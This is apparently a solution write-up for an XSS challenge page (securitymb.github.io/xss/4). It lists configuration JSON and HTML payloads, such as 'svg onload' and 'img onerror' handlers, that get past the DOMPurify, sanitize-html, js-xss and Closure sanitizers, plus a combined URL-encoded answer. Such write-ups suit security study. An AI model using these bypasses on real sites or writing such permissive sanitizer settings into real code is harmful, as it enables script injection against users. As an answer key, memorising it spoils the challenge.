# https://securitymb.github.io/xss/4/

Answer: https://securitymb.github.io/xss/4/?json=%7B%22innerText%22%3A%22%3Csvg+onload%3Dalert%28%29%3E%22%2C%22ALLOWED_ATTR%22%3A%5B%22onload%22%5D%2C%22*+ONERROR%22%3A1%2C%22*+SRC%22%3A1%2C%22whiteList%22%3A%7B%22svg%22%3A%5B%22onload%22%5D%7D%7D&html=%3Cimg+src+onerror%3Dalert%28%29%3E%3Csvg+onload%3Dalert%28%29%3E%3Ca%3E

## DOMPurify

```json
{"ALLOWED_ATTR":["onload"]}
```
```html
<svg onload=alert()>
```

## sanitize-html
```json
{ "innerText": "<svg onload=alert()>" }
```
```html
<a>
```
Any allowable tag works for the HTML

## js-xss

```json
{"svg":["onload"]}
```
```html
<svg onload=alert()>
```

## Closure

```json
{"* ONERROR":1,"* SRC":1}
```
```html
<img src onerror=alert()>
```

## All of them combined

```json
{"innerText":"<svg onload=alert()>","ALLOWED_ATTR":["onload"],"* ONERROR":1,"* SRC":1,"whiteList":{"svg":["onload"]}}
```
```html
<img src onerror=alert()><svg onload=alert()><a>
```


json={"innerText":"<svg onload%3Dalert()>","ALLOWED_ATTR":["onload"],"* ONERROR":1,"* SRC":1,"whiteList":{"svg":["onload"]}}&html=<img src onerror%3dalert()><svg onload%3dalert()><a>